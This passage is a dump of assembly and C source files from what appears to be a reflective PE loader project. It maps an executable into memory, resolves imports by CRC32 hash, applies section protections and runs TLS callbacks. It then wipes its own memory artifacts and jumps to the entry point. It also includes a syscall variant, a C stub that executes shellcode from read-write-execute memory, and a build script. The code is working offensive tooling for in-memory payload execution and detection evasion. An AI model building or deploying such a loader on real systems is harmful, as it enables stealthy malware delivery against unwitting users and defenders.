loc_401f65:	sub    esp,0x18
loc_401f68:	mov    edx,eax
loc_401f6a:	mov    eax,0x0
loc_401f6f:	test   edx,edx
loc_401f71:	js     loc_401fcf 
loc_401f73:	mov    eax,DWORD [edi+0x54]
loc_401f76:	mov    DWORD [esp+0x8],eax
loc_401f7a:	mov    DWORD [esp+0x4],ebp
loc_401f7e:	mov    eax,DWORD [esp+0x2c]
loc_401f82:	mov    DWORD [esp],eax
loc_401f85:	call   memcpy
loc_401f8a:	movzx  eax,WORD [edi+0x14]
loc_401f8e:	lea    ebx,[edi+eax*1+0x18]
loc_401f92:	cmp    WORD [edi+0x6],0x0
loc_401f97:	je     loc_401fcb 
loc_401f99:	mov    esi,0x0
loc_401f9e:	mov    eax,DWORD [ebx+0xc]
loc_401fa1:	add    eax,DWORD [esp+0x2c]
loc_401fa5:	mov    edx,ebp
loc_401fa7:	add    edx,DWORD [ebx+0x14]
loc_401faa:	mov    ecx,DWORD [ebx+0x10]
loc_401fad:	mov    DWORD [esp+0x8],ecx
loc_401fb1:	mov    DWORD [esp+0x4],edx
loc_401fb5:	mov    DWORD [esp],eax
loc_401fb8:	call   memcpy
loc_401fbd:	add    esi,0x1
loc_401fc0:	add    ebx,0x28
loc_401fc3:	movzx  eax,WORD [edi+0x6]
loc_401fc7:	cmp    eax,esi
loc_401fc9:	jg     loc_401f9e 
loc_401fcb:	mov    eax,DWORD [esp+0x2c]
loc_401fcf:	add    esp,0x3c
loc_401fd2:	pop    ebx
loc_401fd3:	pop    esi
loc_401fd4:	pop    edi
loc_401fd5:	pop    ebp
loc_401fd6:	ret

```

`loader/loader-x86/inc/memcpy.asm`:

```asm
[BITS 32]

; memcpy(&dst, &src, size)
memcpy:
	push ebp
	mov ebp, esp	
	push esi
	push edi
	push ecx
	mov edi,[ebp+8]
	mov esi,[ebp+12]
	mov ecx,[ebp+16]
copy_byte:
	rep movsb            ; Copy the CX number of bytes from RSI to RDI
	pop ecx
	pop edi
	pop esi
	mov esp,ebp
	pop ebp
	ret                  ; Return
```

`loader/loader-x86/inc/protect_sections.asm`:

```asm
[BITS 32]

protect_sections:
loc_4057e8:	push   ebp
loc_4057e9:	push   edi
loc_4057ea:	push   esi
loc_4057eb:	push   ebx
loc_4057ec:	sub    esp,0x4c
loc_4057ef:	mov    ebp,DWORD [esp+0x60]
loc_4057f3:	mov    edi,ebp
loc_4057f5:	add    edi,DWORD [ebp+0x3c]
loc_4057f8:	movzx  eax,WORD [edi+0x14]
loc_4057fc:	lea    ebx,[edi+eax*1+0x18]
loc_405800:	mov    DWORD [esp+0x3c],0x0
loc_405808:	cmp    WORD [edi+0x6],0x0
loc_40580d:	je     loc_405840 
loc_40580f:	mov    esi,0x0
loc_405814:	mov    ebp,edi
loc_405816:	jmp    loc_40591e 
loc_40581b:	mov    BYTE [esp+0x2f],0x1
loc_405820:	jmp    loc_405863 
loc_405822:	mov    edx,0x20
loc_405827:	jmp    loc_4058ba 
loc_40582c:	mov    eax,0x0
loc_405831:	jmp    loc_405838 
loc_405833:	mov    eax,0x1
loc_405838:	add    esp,0x4c
loc_40583b:	pop    ebx
loc_40583c:	pop    esi
loc_40583d:	pop    edi
loc_40583e:	pop    ebp
loc_40583f:	ret
loc_405840:	mov    eax,0x1
loc_405845:	jmp    loc_405838 
loc_405847:	mov    edi,eax
loc_405849:	shr    edi,0x1f
loc_40584c:	mov    BYTE [esp+0x2f],0x0
loc_405851:	test   eax,0x20000000
loc_405856:	je     loc_405892 
loc_405858:	mov    edx,0x10
loc_40585d:	mov    ecx,edi
loc_40585f:	test   cl,cl
loc_405861:	je     loc_405897 
loc_405863:	and    eax,0x60000000
loc_405868:	mov    edi,0x1
loc_40586d:	cmp    eax,0x60000000
loc_405872:	mov    edx,0x20
loc_405877:	mov    eax,0x80
loc_40587c:	cmovne edx,eax
loc_40587f:	jmp    loc_4058a7 
loc_405881:	test   eax,0x20000000
loc_405886:	jne    loc_40581b 
loc_405888:	mov    BYTE [esp+0x2f],0x1
loc_40588d:	mov    edx,0x4
loc_405892:	mov    edi,0x0
loc_405897:	and    eax,0x60000000
loc_40589c:	cmp    eax,0x60000000
loc_4058a1:	je     loc_405822 
loc_4058a7:	cmp    BYTE [esp+0x2f],0x0
loc_4058ac:	je     loc_4058ba 
loc_4058ae:	mov    eax,edi
loc_4058b0:	test   al,al
loc_4058b2:	mov    eax,0x40
loc_4058b7:	cmovne edx,eax
loc_4058ba:	mov    eax,DWORD [esp+0x60]
loc_4058be:	mov    ecx,DWORD [esp+0x28]
loc_4058c2:	add    eax,DWORD [ecx+0xc]
loc_4058c5:	mov    DWORD [esp+0x3c],eax
loc_4058c9:	mov    eax,DWORD [ecx+0x10]
loc_4058cc:	mov    DWORD [esp+0x34],eax
loc_4058d0:	mov    DWORD [esp+0x38],0x0
loc_4058d8:	lea    eax,[esp+0x38]
loc_4058dc:	mov    DWORD [esp+0x10],eax
loc_4058e0:	mov    DWORD [esp+0xc],edx
loc_4058e4:	lea    eax,[esp+0x34]
loc_4058e8:	mov    DWORD [esp+0x8],eax
loc_4058ec:	lea    eax,[esp+0x3c]
loc_4058f0:	mov    DWORD [esp+0x4],eax
loc_4058f4:	mov    DWORD [esp],0xffffffff
loc_555555: push   0x6EDE4D41
loc_666666: call   api_call
loc_zzzzzz: add    esp,4
loc_4058fb:	call   eax
loc_405901:	sub    esp,0x14
loc_405904:	test   eax,eax
loc_405906:	js     loc_40582c 
loc_40590c:	add    esi,0x1
loc_40590f:	add    ebx,0x28
loc_405912:	movzx  eax,WORD [ebp+0x6]
loc_405916:	cmp    eax,esi
loc_405918:	jle    loc_405833 
loc_40591e:	mov    DWORD [esp+0x28],ebx
loc_405922:	mov    eax,DWORD [ebx+0x24]
loc_405925:	test   eax,eax
loc_405927:	je     loc_40590c 
loc_405929:	cdq
loc_40592a:	and    edx,0xffffffc8
loc_40592d:	add    edx,0x40
loc_405930:	test   eax,0x40000000
loc_405935:	je     loc_405847 
loc_40593b:	test   eax,eax
loc_40593d:	js     loc_405881 
loc_405943:	mov    edi,0x0
loc_405948:	mov    BYTE [esp+0x2f],0x1
loc_40594d:	mov    edx,0x2
loc_405952:	jmp    loc_405851 

```

`loader/loader-x86/inc/relocate_image.asm`:

```asm
[BITS 32]


relocate_image:
loc_403055:	push   ebp
loc_403056:	push   edi
loc_403057:	push   esi
loc_403058:	push   ebx
loc_403059:	mov    ebp,DWORD [esp+0x14]
loc_40305d:	mov    ebx,ebp
loc_40305f:	add    ebx,DWORD [ebp+0x3c]
loc_403062:	mov    edx,DWORD [ebx+0xa0]
loc_403068:	mov    eax,0x0
loc_40306d:	test   edx,edx
loc_40306f:	je     loc_4030d3 
loc_403071:	add    edx,ebp
loc_403073:	mov    esi,ebp
loc_403075:	sub    esi,DWORD [ebx+0x34]
loc_403078:	cmp    DWORD [edx],0x0
loc_40307b:	jne    loc_4030be 
loc_40307d:	mov    eax,0x1
loc_403082:	jmp    loc_4030d3 
loc_403084:	movzx  ecx,WORD [eax]
loc_403087:	and    ecx,0xfff
loc_40308d:	add    ecx,DWORD [edx]
loc_40308f:	add    DWORD [ebp+ecx*1+0x0],esi
loc_403093:	add    eax,0x2
loc_403096:	mov    ecx,edx
loc_403098:	add    ecx,DWORD [edx+0x4]
loc_40309b:	cmp    eax,ecx
loc_40309d:	je     loc_4030b7 
loc_40309f:	movzx  ecx,BYTE [eax+0x1]
loc_4030a3:	mov    edi,ecx
loc_4030a5:	and    edi,0xfffffff0
loc_4030a8:	mov    ebx,edi
loc_4030aa:	cmp    bl,0x30
loc_4030ad:	je     loc_403084 
loc_4030af:	cmp    cl,0xf
loc_4030b2:	jbe    loc_403093 
loc_4030b4:	int3
loc_4030b5:	jmp    loc_403093 
loc_4030b7:	mov    edx,eax
loc_4030b9:	cmp    DWORD [edx],0x0
loc_4030bc:	je     loc_4030ce 
loc_4030be:	lea    eax,[edx+0x8]
loc_4030c1:	mov    ecx,edx
loc_4030c3:	add    ecx,DWORD [edx+0x4]
loc_4030c6:	cmp    eax,ecx
loc_4030c8:	jne    loc_40309f 
loc_4030ca:	mov    edx,ecx
loc_4030cc:	jmp    loc_4030b9 
loc_4030ce:	mov    eax,0x1
loc_4030d3:	pop    ebx
loc_4030d4:	pop    esi
loc_4030d5:	pop    edi
loc_4030d6:	pop    ebp
loc_4030d7:	ret

```

`loader/loader-x86/inc/resolve_imports.asm`:

```asm
[BITS 32]


resolve_imports:
loc_4042ff:	push   ebp
loc_404300:	push   edi
loc_404301:	push   esi
loc_404302:	push   ebx
loc_404303:	sub    esp,0x2c
loc_404306:	mov    ebp,DWORD [esp+0x40]
loc_40430a:	mov    eax,DWORD [ebp+0x3c]
loc_40430d:	mov    edx,DWORD [ebp+eax*1+0x80]
loc_404314:	mov    eax,0x0
loc_404319:	test   edx,edx
loc_40431b:	je     loc_4043d5 
loc_404321:	lea    eax,[ebp+edx*1+0x0]
loc_404325:	mov    DWORD [esp+0x1c],eax
loc_404329:	mov    eax,DWORD [eax+0xc]
loc_40432c:	test   eax,eax
loc_40432e:	jne    loc_4043a4 
loc_404330:	mov    eax,0x1
loc_404335:	jmp    loc_4043d5 
loc_40433a:	mov    DWORD [esp+0x8],eax
loc_40433e:	mov    DWORD [esp+0x4],0x0
loc_404346:	mov    DWORD [esp],edi
loc_404349:	call   get_proc_by_crc
loc_40434e:	test   eax,eax
loc_404350:	je     loc_404354 
loc_404352:	mov    DWORD [esi],eax
loc_404354:	add    ebx,0x4
loc_404357:	add    esi,0x4
loc_40435a:	mov    eax,DWORD [ebx]
loc_40435c:	test   eax,eax
loc_40435e:	je     loc_404394 
loc_404360:	test   eax,eax
loc_404362:	js     loc_40433a 
loc_404364:	mov    DWORD [esp+0x4],0x0
loc_40436c:	lea    eax,[ebp+eax*1+0x2]
loc_404370:	mov    DWORD [esp],eax
loc_404373:	call   calc_crc
loc_404378:	mov    DWORD [esp+0x8],0xffffffff
loc_404380:	mov    DWORD [esp+0x4],eax
loc_404384:	mov    DWORD [esp],edi
loc_404387:	call   get_proc_by_crc
loc_40438c:	test   eax,eax
loc_40438e:	je     loc_404354 
loc_404390:	mov    DWORD [esi],eax
loc_404392:	jmp    loc_404354 
loc_404394:	add    DWORD [esp+0x1c],0x14
loc_404399:	mov    eax,DWORD [esp+0x1c]
loc_40439d:	mov    eax,DWORD [eax+0xc]
loc_4043a0:	test   eax,eax
loc_4043a2:	je     loc_4043c9 
loc_4043a4:	add    eax,ebp
loc_4043a6:	mov    DWORD [esp],eax
loc_4043a9:	call   load_module
loc_4043ae:	mov    edi,eax
loc_4043b0:	test   eax,eax
loc_4043b2:	je     loc_4043d0 
loc_4043b4:	mov    eax,DWORD [esp+0x1c]
loc_4043b8:	mov    ebx,ebp
loc_4043ba:	add    ebx,DWORD [eax]
loc_4043bc:	mov    esi,ebp
loc_4043be:	add    esi,DWORD [eax+0x10]
loc_4043c1:	mov    eax,DWORD [ebx]
loc_4043c3:	test   eax,eax
loc_4043c5:	jne    loc_404360 
loc_4043c7:	jmp    loc_404394 
loc_4043c9:	mov    eax,0x1
loc_4043ce:	jmp    loc_4043d5 
loc_4043d0:	mov    eax,0x0
loc_4043d5:	add    esp,0x2c
loc_4043d8:	pop    ebx
loc_4043d9:	pop    esi
loc_4043da:	pop    edi
loc_4043db:	pop    ebp
loc_4043dc:	ret

```

`loader/loader-x86/inc/run_tls_callbacks.asm`:

```asm
[BITS 32]


run_tls_callbacks:
loc_406cdf:	push   esi
loc_406ce0:	push   ebx
loc_406ce1:	sub    esp,0x14
loc_406ce4:	mov    esi,DWORD [esp+0x20]
loc_406ce8:	mov    eax,DWORD [esi+0x3c]
loc_406ceb:	mov    edx,DWORD [esi+eax*1+0xc0]
loc_406cf2:	mov    eax,0x0
loc_406cf7:	test   edx,edx
loc_406cf9:	je     loc_406d08 
loc_406cfb:	mov    ebx,DWORD [esi+edx*1+0xc]
loc_406cff:	mov    eax,0x1
loc_406d04:	test   ebx,ebx
loc_406d06:	jne    loc_406d29 
loc_406d08:	add    esp,0x14
loc_406d0b:	pop    ebx
loc_406d0c:	pop    esi
loc_406d0d:	ret
loc_406d0e:	mov    DWORD [esp+0x8],0x0
loc_406d16:	mov    DWORD [esp+0x4],0x1
loc_406d1e:	mov    DWORD [esp],esi
loc_406d21:	call   eax
loc_406d23:	sub    esp,0xc
loc_406d26:	add    ebx,0x4
loc_406d29:	mov    eax,DWORD [ebx]
loc_406d2b:	test   eax,eax
loc_406d2d:	jne    loc_406d0e 
loc_406d2f:	mov    eax,0x1
loc_406d34:	jmp    loc_406d08 

```

`loader/loader-x86/loader-x86-lite.asm`:

```asm
;#===========================================#
;# x86 Reflective Loader                     #
;# Author: Ege Balcı <egebalci@pm.me>        #
;# Version: 3.0                              #
;#===========================================#

[BITS 32]

%define e_lfanew 0x3C
%define _AddressOfEntry 0x28
loader_size	equ     pe_start-loader


	call loader                       ; Start by calling over the PE image
loader:
	pop esi                           ; Get current address into esi
	add esi, loader_size              ; Add the loader size
	push ebp                          ; Save EBP
	mov ebp,esp                       ; Create a stack frame
	push esi                          ; Push the PE address as first parameter
	call map_image                    ; Perform PE image mapping
	pop esi                           ; Pop out the PE address
	push eax                          ; Push new image baes to stack
	call relocate_image               ; Perform image relocation
	call resolve_imports              ; Resolve image imports & create IAT table
	call protect_sections             ; Apply proper section memory protections
	call run_tls_callbacks            ; Try to execute TLS callbacks. May fail... ¯\_(ツ)_/¯ 
	pop edi                           ; Get the new image base value into edi
	mov eax,[edi+e_lfanew]            ; Get the file header offset
	mov eax,[edi+eax+_AddressOfEntry] ; Get the AddressOfEntry into eax
	add eax,edi                       ; Add the AOE onto new image base
	cld                               ; Clear direction flags
	mov esp, ebp                      ; Restore stack frame
	pop ebp                           ; Restore RBP
	jmp eax                           ; Jmp to the PE->AOE
	; ------------------------ FUNCTIONS ------------------------------------
	%include "./inc/memcpy.asm"
	%include "./inc/calc_crc.asm"
	%include "./inc/map_image.asm"
	%include "./inc/load_module.asm"
	%include "./inc/relocate_image.asm"
	%include "./inc/resolve_imports.asm"
	%include "./inc/get_proc_by_crc.asm"
	%include "./inc/get_module_by_crc.asm"
	%include "./inc/protect_sections.asm"
	%include "./inc/run_tls_callbacks.asm"
	%include "../crc32_api/crc32_api_x86.asm"
	;------------------------ FUNCTIONS -------------------------------------
pe_start:
```

`loader/loader-x86/loader-x86.asm`:

```asm
;#===========================================#
;# x86 Reflective Loader                     #
;# Author: Ege Balcı <egebalci@pm.me>        #
;# Version: 3.0                              #
;#===========================================#

[BITS 32]

%define e_lfanew 0x3C
%define _AddressOfEntry 0x28

	call start                        ; Start by calling over the PE image
	incbin "putty.exe"                ; PE image
start:
	pop esi                           ; Get the PE address into esi
	push ebp                          ; Save EBP
	mov ebp,esp                       ; Create a stack frame
	push esi                          ; Push the PE address as first parameter
	call map_image                    ; Perform PE image mapping
	pop esi                           ; Pop out the PE address
	push eax                          ; Push new image baes to stack
	call relocate_image               ; Perform image relocation
	call resolve_imports              ; Resolve image imports & create IAT table
	call protect_sections             ; Apply proper section memory protections
	call run_tls_callbacks            ; Try to execute TLS callbacks. May fail... ¯\_(ツ)_/¯ 
	pop edi                           ; Get the new image base value into edi
	mov eax,[edi+e_lfanew]            ; Get the file header offset
	mov eax,[edi+eax+_AddressOfEntry] ; Get the AddressOfEntry into eax
	add eax,edi                       ; Add the AOE onto new image base
	jmp wipe                          ; Wipe memory artifacts
	; ------------------------ FUNCTIONS ------------------------------------
	%include "./inc/memcpy.asm"
	%include "./inc/calc_crc.asm"
	%include "./inc/map_image.asm"
	%include "./inc/load_module.asm"
	%include "./inc/relocate_image.asm"
	%include "./inc/resolve_imports.asm"
	%include "./inc/get_proc_by_crc.asm"
	%include "./inc/get_module_by_crc.asm"
	%include "./inc/protect_sections.asm"
	%include "./inc/run_tls_callbacks.asm"
	%include "../crc32_api/crc32_api_x86.asm"
	;------------------------ FUNCTIONS -------------------------------------
wipe:
	wipe_len_delta	equ     wipe_end-wipe
	call $+5                          ; Get current EIP to stack
	pop ecx                           ; Pop currect EIP to RCX
	sub ecx,esi                       ; Calculate the size of the PE file
	add ecx,wipe_len_delta            ; Add the size of wipe code 
	mov edi,esi                       ; Move the PE address to RDI
	sub edi,0x5                       ; Go back 5 bytes for wiping the initial call as well
wipe_end:
	rep stosb                         ; Store AL into RDI and decrement RDI until RCX = 0
	; -------------------- SWITCH TO PE ----------------------------
	cld                               ; Clear direction flags
	mov esp, ebp                      ; Restore stack frame
	pop ebp                           ; Restore RBP
	jmp eax                           ; Jmp to the PE->AOE
```

`loader/loader-x86/stub.c`:

```c
#include <windows.h>
#include "shellcode.h"

int main(int argc, char const *argv[])
{
	char* BUFFER = (char*)VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(BUFFER, shellcode, sizeof(shellcode));
	(*(void(*)())BUFFER)();
	return 0;
}

```

`loader/syscall-loader-x64/build.sh`:

```sh
#!/bin/bash
## ANSI Colors (FG & BG)
RED="$(printf '\033[31m')" GREEN="$(printf '\033[32m')" YELLOW="$(printf '\033[33m')" BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')" CYAN="$(printf '\033[36m')" WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')" GREENBG="$(printf '\033[42m')" YELLOWBG="$(printf '\033[43m')" BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')" CYANBG="$(printf '\033[46m')" WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESET="$(printf '\e[0m')"

print_warning() {
  echo ${YELLOW}"[!] ${RESET}${1}"
}
print_error() {
  echo "${RED}[-] ${RESET}${1}"
}
print_fatal() {
  echo -e ${RED}"[!] $1\n${RESET}"
  kill -10 $$
}
print_good() {
  echo "${GREEN}[+] ${RESET}${1}"
}
print_status() {
    echo "${YELLOW}[*] ${RESET}${1}"
}

nasm -f bin syscall-loader-x64.asm -o shellcode || print_fatal "nasm failed!"
print_status "Payload Size: `wc -c shellcode|cut -d' ' -f1`"
[[ -f shellcode ]] && xxd -i shellcode shellcode.h

x86_64-w64-mingw32-gcc stub.c -o test.exe || print_fatal "Compilation failed!"
cp test.exe /tmp/
rm shellcode shellcode.h
print_good "Build done!" 

```

`loader/syscall-loader-x64/inc/calc_crc.asm`:

```asm
[BITS 64]


calc_crc:
	test   dx,dx
	je     loc_1400039c9 
	mov    r8,rcx
	movzx  edx,dx
	lea    eax,[rdx-0x1]
	lea    rdx,[rcx+rax*1+0x1]
	mov    eax,0x0
loc_1400039b8:
	crc32  eax,BYTE [r8]
	add    r8,0x1
	cmp    r8,rdx
	jne    loc_1400039b8 
	jmp    loc_1400039ea 
loc_1400039c9:
	movzx  edx,BYTE [rcx]
	test   dl,dl
	je     loc_1400039eb 
	add    rcx,0x1
	mov    eax,0x0
loc_1400039d9:
	crc32  eax,dl
	add    rcx,0x1
	movzx  edx,BYTE [rcx-0x1]
	test   dl,dl
	jne    loc_1400039d9 
loc_1400039ea:
	ret
loc_1400039eb:
	mov    eax,0x0
	jmp    loc_1400039ea
```

`loader/syscall-loader-x64/inc/get_module_by_crc.asm`:

```asm
[BITS 64]


get_module_by_crc:
	push   rdi
	push   rsi
	push   rbx
	sub    rsp,0x20
	mov    esi,ecx
	mov    rax,QWORD gs:0x60
	mov    rax,QWORD [rax+0x18]
	lea    rdi,[rax+0x20]
	mov    rbx,QWORD [rax+0x20]
	cmp    rdi,rbx
	je     loc_140102e89 
loc_140102e5d:
	movzx  edx,WORD [rbx+0x48]
	mov    rcx,QWORD [rbx+0x50]
	call   calc_crc
	cmp    eax,esi
	je     loc_140102e7d 
	mov    rbx,QWORD [rbx]
	cmp    rdi,rbx
	jne    loc_140102e5d 
	mov    eax,0x0
	jmp    loc_140102e81 
loc_140102e7d:
	mov    rax,QWORD [rbx+0x20]
loc_140102e81:
	add    rsp,0x20
	pop    rbx
	pop    rsi
	pop    rdi
	ret
loc_140102e89:
	mov    eax,0x0
	jmp    loc_140102e81 

```

`loader/syscall-loader-x64/inc/get_proc_by_crc.asm`:

```asm
[BITS 64]


get_proc_by_crc:
	push   r15
	push   r14
	push   r13
	push   r12
	push   rbp
	push   rdi
	push   rsi
	push   rbx
	sub    rsp,0x258
	mov    rbx,rcx
	mov    r13d,edx
	mov    ebp,r8d
	movsxd rax,DWORD [rcx+0x3c]
	add    rax,rcx
	mov    esi,DWORD [rax+0x88]
	add    rsi,rcx
	mov    eax,DWORD [rax+0x8c]
	mov    DWORD [rsp+0x2c],eax
	mov    r12d,DWORD [rsi+0x20]
	mov    r14d,DWORD [rsi+0x1c]
	mov    r15d,DWORD [rsi+0x24]
	mov    eax,DWORD [rsi+0x18]
	test   eax,eax
	je     loc_140003764 
	mov    eax,eax
	mov    QWORD [rsp+0x20],rax
	mov    edi,0x0
	add    r12,rcx
loc_1400035dc:
	mov    ecx,DWORD [r12+rdi*4]
	add    rcx,rbx
	mov    edx,0x0
	call   calc_crc
	cmp    ebp,edi
	je     loc_14000360b 
	cmp    eax,r13d
	je     loc_14000360b 
	add    rdi,0x1
	cmp    QWORD [rsp+0x20],rdi
	jne    loc_1400035dc 
	mov    eax,0x0
	jmp    loc_140003738 
loc_14000360b:
	lea    rax,[rbx+rdi*2]
	movzx  eax,WORD [rax+r15*1]
	lea    rax,[rbx+rax*4]
	mov    eax,DWORD [rax+r14*1]
	add    rbx,rax
	cmp    rbx,rsi
	jb     loc_140003735 
	mov    eax,DWORD [rsp+0x2c]
	add    rsi,rax
	cmp    rbx,rsi
	jae    loc_140003735 
	mov    QWORD [rsp+0x30],0x0
	mov    QWORD [rsp+0x38],0x0
	lea    rdi,[rsp+0x40]
	mov    eax,0x0
	mov    ecx,0x1e
	rep stosq
	mov    DWORD [rdi],0x0
	mov    QWORD [rsp+0x140],0x0
	mov    QWORD [rsp+0x148],0x0
	lea    rdi,[rsp+0x150]
	mov    ecx,0x1e
	rep stosq
	mov    DWORD [rdi],0x0
	cmp    BYTE [rbx],0x2e
	je     loc_14000374c 
	mov    eax,0x1
loc_14000369e:
	mov    r8,rax
	add    rax,0x1
	cmp    BYTE [rbx+rax*1-0x1],0x2e
	jne    loc_14000369e 
	mov    esi,r8d
loc_1400036af:
	lea    rcx,[rsp+0x30]
	mov    rdx,rbx
	call   memcpy
	lea    ecx,[rsi+0x1]
	movsxd rcx,ecx
	add    rcx,rbx
	cmp    BYTE [rcx],0x0
	je     loc_14000375c 
	mov    eax,0x1
	movsxd rdx,esi
	add    rdx,rbx
loc_1400036d9:
	mov    r8,rax
	add    rax,0x1
	cmp    BYTE [rdx+rax*1],0x0
	jne    loc_1400036d9 
loc_1400036e6:
	lea    rax,[rsp+0x140]
	mov    rdx,rcx
	mov    rcx,rax
	call   memcpy
	lea    rcx,[rsp+0x30]
	call   load_module
	mov    rbx,rax
	mov    eax,0x0
	test   rbx,rbx
	je     loc_140003738 
	lea    rcx,[rsp+0x140]
	mov    edx,0x0
	call   calc_crc
	mov    edx,eax
	mov    r8d,0xffffffff
	mov    rcx,rbx
	call   get_proc_by_crc
	mov    rbx,rax
loc_140003735:
	mov    rax,rbx
loc_140003738:
	add    rsp,0x258
	pop    rbx
	pop    rsi
	pop    rdi
	pop    rbp
	pop    r12
	pop    r13
	pop    r14
	pop    r15
	ret
loc_14000374c:
	mov    esi,0x0
	mov    r8d,0x0
	jmp    loc_1400036af 
loc_14000375c:
	mov    r8d,0x0
	jmp    loc_1400036e6 
loc_140003764:
	mov    eax,0x0
	jmp    loc_140003738 
```

`loader/syscall-loader-x64/inc/load_module.asm`:

```asm
[BITS 64]


load_module:
	push   rdi
	sub    rsp,0x250
	mov    r8,rcx
	mov    QWORD [rsp+0x248],0x0
	mov    DWORD [rsp+0x234],0x0
	lea    rdi,[rsp+0x20]
	mov    ecx,0x41
	mov    eax,0x0
	rep stosq
	cmp    BYTE [r8],0x0
	je     loc_140003873 
	mov    edx,0x1
loc_1400037eb:
	mov    rax,rdx
	add    rdx,0x1
	cmp    BYTE [r8+rdx*1-0x1],0x0
	jne    loc_1400037eb 
	lea    edx,[rax+rax*1]
	mov    WORD [rsp+0x230],dx
	add    edx,0x2
	mov    WORD [rsp+0x232],dx
	lea    rdx,[rsp+0x20]
	mov    QWORD [rsp+0x238],rdx
	sub    eax,0x1
	js     loc_140003837 
	cdqe
loc_140003824:
	movsx  dx,BYTE [r8+rax*1]
	mov    WORD [rsp+rax*2+0x20],dx
	sub    rax,0x1
	test   eax,eax
	jns    loc_140003824 
loc_140003837:
	lea    r9,[rsp+0x248]
	lea    r8,[rsp+0x230]
	mov    edx,0x0
	mov    ecx,0x0
	mov    r10, 0xB4EBB9A4
	call   api_call
	call   rax        ; <LdrLoadDll> 
	test   eax,eax
	js     loc_14000386c 
	mov    rax,QWORD [rsp+0x248]
loc_140003863:
	add    rsp,0x250
	pop    rdi
	ret
loc_14000386c:
	mov    eax,0x0
	jmp    loc_140003863 
loc_140003873:
	mov    WORD [rsp+0x230],0x0
	mov    WORD [rsp+0x232],0x2
	lea    rax,[rsp+0x20]
	mov    QWORD [rsp+0x238],rax
	jmp    loc_140003837
```

`loader/syscall-loader-x64/inc/map_image.asm`:

```asm
[BITS 64]


map_image:
	push   rbp
	push   rdi
	push   rsi
	push   rbx
	sub    rsp,0x48
	mov    rbp,rcx
	movsxd rdi,DWORD [rcx+0x3c]
	add    rdi,rcx
	mov    eax,0x0
	cmp    DWORD [rdi],0x4550
	jne    loc_1400020b8 
	mov    QWORD [rsp+0x38],0x0
	mov    eax,DWORD [rdi+0x50]
	mov    QWORD [rsp+0x30],rax
	lea    rdx,[rsp+0x38]
	mov    DWORD [rsp+0x28],0x4
	mov    DWORD [rsp+0x20],0x103000
	lea    r9,[rsp+0x30]
	mov    r8d,0x0
	mov    rcx,0xffffffffffffffff
	mov    r10, 0x99CE7C55
	call   api_call
	mov    r10,rax
	call   syscall_api
	;call   rax        ; <NtAllocateVirtualMemory>
	mov    edx,eax
	mov    eax,0x0
	test   edx,edx
	js     loc_1400020b8 
	mov    r8d,DWORD [rdi+0x54]
	mov    rdx,rbp
	mov    rcx,QWORD [rsp+0x38]
	call   memcpy
	movzx  eax,WORD [rdi+0x14]
	lea    rbx,[rdi+rax*1+0x18]
	cmp    WORD [rdi+0x6],0x0
	je     loc_1400020b3 
	mov    esi,0x0
loc_14000208d:
	mov    ecx,DWORD [rbx+0xc]
	add    rcx,QWORD [rsp+0x38]
	mov    edx,DWORD [rbx+0x14]
	add    rdx,rbp
	mov    r8d,DWORD [rbx+0x10]
	call   memcpy
	add    esi,0x1
	add    rbx,0x28
	movzx  eax,WORD [rdi+0x6]
	cmp    eax,esi
	jg     loc_14000208d 
loc_1400020b3:
	mov    rax,QWORD [rsp+0x38]
loc_1400020b8:
	add    rsp,0x48
	pop    rbx
	pop    rsi
	pop    rdi
	pop    rbp
	ret
```

`loader/syscall-loader-x64/inc/memcpy.asm`:

```asm
[BITS 64]

; memcpy(&dst, &src, size)
; RCX = &dst
; RDX = &src
; R8  = size
memcpy:
	push rsi
	push rdi
	mov rdi,rcx
	mov rsi,rdx
	mov rcx,r8
copy_byte:
	rep movsb            ; Copy the CX number of bytes from RSI to RDI
	pop rdi              ; Restore RDI
	pop rsi              ; Restore RSI
	ret                  ; Return
```

`loader/syscall-loader-x64/inc/protect_sections.asm`:

```asm
[BITS 64]


protect_sections:
	push   r14
	push   r13
	push   r12
	push   rbp
	push   rdi
	push   rsi
	push   rbx
	sub    rsp,0x50
	mov    rbp,rcx
	movsxd rdi,DWORD [rcx+0x3c]
	add    rdi,rcx
	movzx  eax,WORD [rdi+0x14]
	lea    rbx,[rdi+rax*1+0x18]
	mov    QWORD [rsp+0x48],0x0
	cmp    WORD [rdi+0x6],0x0
	je     loc_140002e87 
	mov    esi,0x0
	mov    r12d,0x0
	lea    r14,[rsp+0x40]
	lea    r13,[rsp+0x48]
	jmp    loc_140002f50 
loc_140002e38:
	mov    ecx,0x1
loc_140002e3d:
	and    eax,0x60000000
	mov    r8d,0x1
	cmp    eax,0x60000000
	mov    r9d,0x20
	mov    eax,0x80
	cmovne r9d,eax
	jmp    loc_140002eed 
loc_140002e61:
	mov    r9d,0x20
	jmp    loc_140002efd 
loc_140002e6c:
	mov    eax,0x0
	jmp    loc_140002e78 
loc_140002e73:
	mov    eax,0x1
loc_140002e78:
	add    rsp,0x50
	pop    rbx
	pop    rsi
	pop    rdi
	pop    rbp
	pop    r12
	pop    r13
	pop    r14
	ret
loc_140002e87:
	mov    eax,0x1
	jmp    loc_140002e78 
loc_140002e8e:
	mov    ecx,0x1
	mov    r8d,r12d
	mov    r9d,0x10
	jmp    loc_140002edd 
loc_140002e9e:
	mov    ecx,r12d
	test   eax,0x20000000
	je     loc_140002eda 
	mov    ecx,0x0
	test   eax,eax
	js     loc_140002e3d 
	mov    ecx,eax
	shr    ecx,0x1f
	mov    r8d,ecx
	mov    ecx,r12d
	mov    r9d,0x10
	jmp    loc_140002edd 
loc_140002ec4:
	test   eax,0x20000000
	jne    loc_140002e38 
	mov    ecx,0x1
	mov    r9d,0x4
loc_140002eda:
	mov    r8d,r12d
loc_140002edd:
	and    eax,0x60000000
	cmp    eax,0x60000000
	je     loc_140002e61 
loc_140002eed:
	test   cl,cl
	je     loc_140002efd 
	test   r8b,r8b
	mov    eax,0x40
	cmovne r9d,eax
loc_140002efd:
	mov    eax,DWORD [rdx+0xc]
	add    rax,rbp
	mov    QWORD [rsp+0x48],rax
	mov    eax,DWORD [rdx+0x10]
	mov    QWORD [rsp+0x40],rax
	mov    DWORD [rsp+0x3c],0x0
